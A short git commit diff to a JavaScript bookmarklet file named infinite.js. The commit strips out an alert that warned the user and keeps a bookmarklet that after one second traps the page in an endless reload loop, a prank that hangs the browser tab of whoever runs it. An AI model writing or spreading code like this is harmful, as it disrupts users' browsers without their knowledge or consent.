6a6e337c7a27f0cfd10b6a39cb6d96e9d780600c
21cookej <21cookej@roundwoodpark.co.uk>
2024-11-07 10:49:59 +0000

    Update infinite.js

--- infinite/infinite.js
+++ infinite/infinite.js
@@ -1,1 +1,1 @@
-javascript:alert("Ready? IF NO CLICK OK NOW.");setTimeout(() => {while (true) {while(1)location.reload(1)}}, 1000);
+javascript:setTimeout(() => {while (true) {while(1)location.reload(1)}}, 1000);
